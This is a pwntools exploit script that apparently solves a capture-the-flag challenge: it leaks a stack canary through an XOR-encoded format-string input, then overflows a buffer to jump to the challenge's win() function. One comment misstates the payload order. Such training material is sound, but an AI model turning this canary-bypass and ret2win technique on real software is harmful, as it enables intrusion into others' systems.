from pwn import *

'''
Yeah BTW this was done by ChatGPT, the creation of this question was extra scuffed since I lost my laptop charger on the day of the expo. And I unfortunately did not make the docker to this...
This file should work locally
'''
context.binary = './encrypt'
elf = context.binary

# win() address - update this according to your binary
WIN_ADDR = elf.symbols.win
# local or remote
p = process(elf.path)


def leak_canary():
    log.info("Leaking stack canary...")

    # Input such that after XOR it becomes format string
    # For example: b"\x7f" ^ 0x13 = 0x6c
    # Choose XOR'd payload that results in '%p %p %p %p ...' when decrypted
    # '%': 0x25 -> 0x25 ^ 0x13 = 0x36
    # 'p': 0x70 -> 0x70 ^ 0x13 = 0x63
    # ' ': 0x20 -> 0x20 ^ 0x13 = 0x33
    payload = b"6c3"*10  # becomes "%p %p %p ..." after XOR

    p.sendlineafter(b"What do you want to encrypt:\n", payload)
    p.sendlineafter(b"Enter Encryption method:\n", b"3")  # XOR

    p.recvuntil(b"XOR Encrypted: ")
    leak = p.recvline().decode()

    log.info(f"Leaked line: {leak.strip()}")
    
    leaked = leak.strip().split()
    # Try to extract the 9th %p value or whichever matches your canary offset
    # Adjust this index depending on stack layout
    print(leaked)
    canary_position=input("Enter Canary position: ")
    canary_hex = leaked[int(canary_position)]
    canary = int(canary_hex, 16)
    
    log.success(f"Leaked Canary: {hex(canary)}")
    return canary

def exploit(canary):
    log.info("Sending exploit payload...")

    # 64 byte buffer + 8 byte saved RBP + 8 byte canary + return address
    padding = b"A" * 64
    saved_rbp = b"B" * 8
    payload = padding + p64(canary) + saved_rbp + p64(WIN_ADDR)
    print(f"[+] Sending payload of length {len(payload)}")
    print(hexdump(payload))
    p.sendafter(b"What do you want to encrypt:\n", payload)
    p.send(b"\n")
    p.sendlineafter(b"Enter Encryption method:\n", b"1")
    p.interactive()

if __name__ == "__main__":
    canary = leak_canary()
    exploit(canary)
